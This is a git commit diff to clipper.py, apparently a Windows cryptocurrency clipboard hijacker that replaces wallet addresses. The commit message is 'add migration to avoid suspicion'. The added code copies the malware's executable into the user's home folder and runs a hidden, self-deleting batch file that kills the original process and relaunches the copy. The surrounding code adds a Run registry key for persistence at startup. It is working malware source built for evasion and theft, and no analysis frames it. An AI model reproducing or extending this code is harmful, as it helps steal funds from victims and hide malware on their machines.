129e3b283cf65d7f1a190e9a7e4b8def5bbc2847
JuicyChann <nik.xeiladakis@gmail.com>
2023-07-24 01:31:57 +0300

    add migration to avoid suspicion

--- clipper.py
+++ clipper.py
@@ -2,6 +2,10 @@ import pyperclip
 import re
 import winreg
 import os
+import shutil
+import sys
+import subprocess
+from getpass import getuser
 
 # leave addresses blank if you don't want to replace them
 addresses = {
@@ -15,8 +19,19 @@ addresses = {
     'TRX': ''
 }
 
+# migration magic (thanks pysilon - mategol)
+get_file_name = os.path.basename(sys.executable)
+if sys.argv[0].lower() != 'c:\\users\\' + getuser() + '\\' + get_file_name and not os.path.exists('C:\\Users\\' + getuser() + '\\' + get_file_name):
+    shutil.copy2(sys.argv[0], 'C:\\Users\\' + getuser() + '\\' + get_file_name)
+
+    with open(f'C:\\Users\\{getuser()}\\activate.bat', 'w', encoding='utf-8') as activator:
+        process_name = sys.argv[0].split('\\')[-1]
+        activator.write(f'pushd "C:\\Users\\{getuser()}"\ntaskkill /f /im "{process_name}"\nstart "" "{get_file_name}"\ndel "%~f0"')
+    subprocess.Popen(f'C:\\Users\\{getuser()}\\activate.bat', creationflags=subprocess.CREATE_NO_WINDOW).wait()
+    sys.exit(0)
+
 def startup():
-    get_file_name = os.path.basename(__file__)
+    get_file_name = os.path.basename(sys.executable)
     registry = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
     winreg.OpenKey(registry, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
     winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
